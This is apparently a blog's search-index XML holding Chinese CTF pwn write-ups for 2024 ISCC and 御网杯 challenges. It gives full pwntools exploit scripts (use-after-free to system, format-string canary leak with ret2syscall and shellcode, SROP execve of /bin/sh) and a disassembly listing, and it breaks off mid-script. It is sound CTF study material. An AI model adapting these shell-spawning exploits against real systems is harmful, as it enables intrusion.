<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024 iscc</title>
    <url>/2025/04/06/2024iscc%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>又快iscc了复现一下去年的，打这个比赛的时候还是个刚入门的小菜鸡</p>
<h2 id="ISCC-U"><a href="#ISCC-U" class="headerlink" title="ISCC_U"></a>ISCC_U</h2><p>和hicton lab中的那个UAF一样，但没有后门函数需要泄露地址，堆块限制5个</p>
<p>思路：</p>
<ol>
<li>通过unsortedbin泄露地址</li>
<li>uaf嘛，借助hicton lab那道题的思想，篡改结构体中的print_note_content的指针为system</li>
</ol>
<p>glibc2.23的情况下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./iscc_U&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&#x27;What\&#x27;s your choice :&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;dada&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;dada&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;dada&#x27;</span>)</span><br><span class="line">data = uu32(r(<span class="number">4</span>)) - <span class="number">0x1b07b0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,data)</span><br><span class="line">system_addr = data + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = data + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one = data + gadgets[<span class="number">0</span>]</span><br><span class="line">leak(<span class="string">&#x27;one&#x27;</span>,one)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>, p32(system_addr) + <span class="string">b&#x27;;sh\x00&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p>glibc2.31的情况下，思路一样，第一个堆块要大于0x400放入unsortedbin中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./iscc_U&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&#x27;What\&#x27;s your choice :&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;dada&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;dada&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;dada&#x27;</span>)</span><br><span class="line">data = uu32(r(<span class="number">4</span>)) - <span class="number">0x1b07b0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,data)</span><br><span class="line">system_addr = data + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = data + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>, p32(system_addr) + <span class="string">b&#x27;;sh\x00&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h3 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h3><p>32位get shell : <code>add(0x8, p32(system_addr) + b&#39;;sh\x00&#39;)</code></p>
<h2 id="heapheap"><a href="#heapheap" class="headerlink" title="heapheap"></a>heapheap</h2><p>有沙盒</p>
<p>但是四个功能齐全</p>
<h2 id="miao"><a href="#miao" class="headerlink" title="miao"></a>miao</h2><p>格式化字符串 + ret2syscall</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-04-14 21:13:06</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">fmt = <span class="string">b&#x27;%31$p&#x27;</span></span><br><span class="line">bin_sh = <span class="number">0x080bb7c8</span> </span><br><span class="line">int_80 = <span class="number">0x0806cf83</span></span><br><span class="line">eax = <span class="number">0x080b8666</span></span><br><span class="line">edcbx = <span class="number">0x0806f330</span></span><br><span class="line">mprotect = <span class="number">0x0806E3D0</span></span><br><span class="line">ru(<span class="string">b&#x27;Would you like to say something to it?&#x27;</span>)</span><br><span class="line">sl(fmt)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(r(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">ru(<span class="string">b&quot; (  ^.^  ) \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x64</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span> </span><br><span class="line">payload += p32(eax) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(edcbx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br><span class="line"><span class="comment">##用mprotect()这个bss的位置可能需要调一下</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">0xc</span>)+p32(canary)+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>)</span><br><span class="line">payload += p32(mprotect)+p32(edcbx)+p32(<span class="number">7</span>)+p32(<span class="number">0x1000</span>)+p32(bss)</span><br><span class="line">payload += p32(read)+p32(edcbx)+p32(<span class="number">0x100</span>)+p32(bss)+p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bss)</span><br><span class="line">sl(payload)</span><br><span class="line">shellcode = <span class="string">b&#x27;\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&#x27;</span></span><br><span class="line">sl(shellcode)</span><br></pre></td></tr></table></figure>

<h3 id="32位寄存器传参"><a href="#32位寄存器传参" class="headerlink" title="32位寄存器传参"></a>32位寄存器传参</h3><p><strong>寄存器传递</strong>：</p>
<ul>
<li>前 5 个整型或指针类型的参数通过寄存器传递。这些寄存器是：<ul>
<li><code>EAX</code>：用于返回值</li>
<li><code>EBX</code>、<code>ECX</code>、<code>EDX</code>、<code>ESI</code> 和 <code>EDI</code>：用于传递参数（参数列表从左到右的顺序）</li>
</ul>
</li>
</ul>
<h3 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h3><p><code>mprotect()</code> 函数是一个系统调用，用于更改已映射内存区域的保护属性。它通常在需要更改内存区域的访问权限时使用，例如在实现内存保护、执行代码或读写操作时。<code>mprotect()</code> 函数通常用于操作系统的内存管理，特别是在 Unix&#x2F;Linux 系统中。</p>
<p><strong>函数原型</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>参数</strong></p>
<ul>
<li><strong><code>addr</code></strong>：指向要更改保护属性的内存区域的起始地址。该地址必须是页面大小的倍数，通常为 4096 字节（4KB）。</li>
<li><strong><code>len</code></strong>：要更改保护属性的内存区域的长度（以字节为单位）。同样，这个值也必须是页面大小的倍数。</li>
<li><strong><code>prot</code></strong>：新的保护属性标志，可以是以下之一的组合：<ul>
<li><code>PROT_READ</code>：允许读取。</li>
<li><code>PROT_WRITE</code>：允许写入。</li>
<li><code>PROT_EXEC</code>：允许执行。</li>
<li><code>PROT_NONE</code>：禁止访问。</li>
</ul>
</li>
</ul>
<p><strong>返回值</strong></p>
<ul>
<li><p>如果成功，<code>mprotect()</code> 返回 0。</p>
</li>
<li><p>如果失败，返回 -1，并且设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">errno</span><br></pre></td></tr></table></figure>

<p>以指示错误类型。常见的错误包括：</p>
<ul>
<li><code>EINVAL</code>：无效的参数（例如，<code>addr</code> 不是页面大小的倍数）。</li>
<li><code>ENOMEM</code>：请求的内存区域无法访问。</li>
<li><code>EPERM</code>：试图设置不允许的保护属性（例如，尝试执行一个没有执行权限的内存区域）。</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2024 御网杯</title>
    <url>/2025/04/06/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h1><p>一道SROP，保护全关，代码较短直接看汇编：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401000 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000 ; signed __int64 start()</span><br><span class="line">.text:0000000000401000                 public _start</span><br><span class="line">.text:0000000000401000 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000401000                                         ; LOAD:0000000000400088↑o</span><br><span class="line">.text:0000000000401000                 mov     eax, 1</span><br><span class="line">.text:0000000000401005                 mov     edi, 1          ; fd</span><br><span class="line">.text:000000000040100A                 mov     rsi, offset msg ; &quot;Hello Pwn&quot;</span><br><span class="line">.text:0000000000401014                 mov     edx, 9          ; count</span><br><span class="line">.text:0000000000401019                 syscall                 ; LINUX - sys_write</span><br><span class="line">.text:000000000040101B                 mov     eax, 0</span><br><span class="line">.text:0000000000401020                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:0000000000401023                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000401028                 mov     edx, 190h       ; count</span><br><span class="line">.text:000000000040102D                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:000000000040102F                 retn</span><br><span class="line">.text:000000000040102F _start          endp</span><br><span class="line">.text:000000000040102F</span><br><span class="line">.text:0000000000401030 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000401030                 shl     rax, 1</span><br><span class="line">.text:0000000000401033                 retn</span><br><span class="line">.text:0000000000401034 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000401034                 mov     ecx, 1</span><br><span class="line">.text:0000000000401039                 xor     rax, rcx</span><br><span class="line">.text:000000000040103C                 retn</span><br><span class="line">.text:000000000040103D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040103D                 xor     rax, rax</span><br><span class="line">.text:0000000000401040                 retn</span><br><span class="line">.text:0000000000401040 _text           ends</span><br><span class="line">.text:0000000000401040</span><br><span class="line">.data:0000000000402000 ; ===========================================================================</span><br><span class="line">.data:0000000000402000</span><br><span class="line">.data:0000000000402000 ; Segment type: Pure data</span><br><span class="line">.data:0000000000402000 ; Segment permissions: Read/Write</span><br><span class="line">.data:0000000000402000 _data           segment dword public &#x27;DATA&#x27; use64</span><br><span class="line">.data:0000000000402000                 assume cs:_data</span><br><span class="line">.data:0000000000402000                 ;org 402000h</span><br><span class="line">.data:0000000000402000 ; char msg[]</span><br><span class="line">.data:0000000000402000 msg             db &#x27;Hello Pwn&#x27;,0        ; DATA XREF: LOAD:00000000004000C0↑o</span><br><span class="line">.data:0000000000402000                                         ; _start+A↑o</span><br><span class="line">.data:000000000040200A sh              db &#x27;/bin/sh&#x27;,0</span><br><span class="line">.data:000000000040200A _data           ends</span><br><span class="line">.data:000000000040200A</span><br><span class="line">.data:000000000040200A</span><br><span class="line">.data:000000000040200A                 end _start</span><br></pre></td></tr></table></figure>

<p>明显的看到在read()处是有溢出的，且read()是向rsp，即返回地址处写值</p>
<p>很明显的SROP，三个gadgets，rax可控制</p>
<p>shl rax,1是将rax左移一位，相当于乘二</p>
<p>思路：先通过利用gadgets设置rax &#x3D;15即1111，左移三次再加一即可得到，syscall一下就可调用 sigreturn，然后通过pwntools直接执行excve(bin&#x2F;sh,0,0),exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-08 15:33:06</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">shl_rax = <span class="number">0x401030</span></span><br><span class="line">syscall = <span class="number">0x40102D</span> </span><br><span class="line">xor_rax = <span class="number">0x40103D</span></span><br><span class="line">mov_ecx = <span class="number">0x401034</span> </span><br><span class="line">bin_sh = <span class="number">0x40200A</span></span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = <span class="number">0x3b</span></span><br><span class="line">sigframe.rdi = bin_sh</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = p64(xor_rax) + p64(mov_ecx) + p64(shl_rax) +p64(mov_ecx) + p64(shl_rax)+ p64(mov_ecx) + p64(shl_rax) + p64(mov_ecx)</span><br><span class="line">payload += p64(syscall) + flat(sigframe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>

<h1 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h1><p>无保护</p>
<p>格式化字符串+栈迁移</p>
<p>中间有一个随机数必须大于144才能溢出到rbp+8，真恶心</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-08 18:04:43</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,gdbscript=&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#b *0x400863</span></span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span 